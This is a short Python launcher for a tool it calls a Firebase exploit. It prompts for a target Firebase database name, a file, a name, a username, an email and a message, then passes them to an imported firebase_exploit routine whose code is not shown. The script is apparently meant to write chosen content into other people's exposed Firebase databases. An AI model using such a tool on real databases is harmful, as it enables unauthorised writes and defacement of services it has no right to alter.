from .modules.firebaseExploit import ExploitByExpoFileTool


def expofire():
    # TODO: add cli --arguments for no uotput after start
    print("Input settings for exploit: ")
    firebase_instance = input("\t> Enter Firebase DB name : ")
    file = input("\t> Enter Your File Name: ")
    name = input("\t> Enter Your Name: ")
    nick_name = input("\t> Enter Your Username: ")
    email = input("\t> Enter Your Email: ")
    message = input("\t> Enter Your Message : ")

    return ExploitByExpoFileTool(firebase_instance, file, name, nick_name, email, message).firebase_exploit()


if __name__ == '__main__':
    expofire()
